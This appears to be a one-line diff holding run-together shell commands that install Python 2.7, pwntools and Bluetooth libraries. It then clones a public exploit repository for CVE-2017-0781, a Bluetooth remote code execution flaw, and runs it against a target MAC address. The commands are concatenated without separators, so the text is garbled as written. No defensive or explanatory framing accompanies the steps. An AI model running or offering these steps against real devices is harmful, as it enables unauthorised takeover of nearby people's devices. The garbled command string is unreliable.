@@ -1,0 +1,1 @@
+apt-get updateapt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialpip install --upgrade pippip install --upgrade pwntoolsapt-get install bluetooth libbluetooth-devpip install pybluezgit clone https://github.com/ojasookert/CVE-2017-0781python CVE-2017-0781.py TARGET = <MAC address>
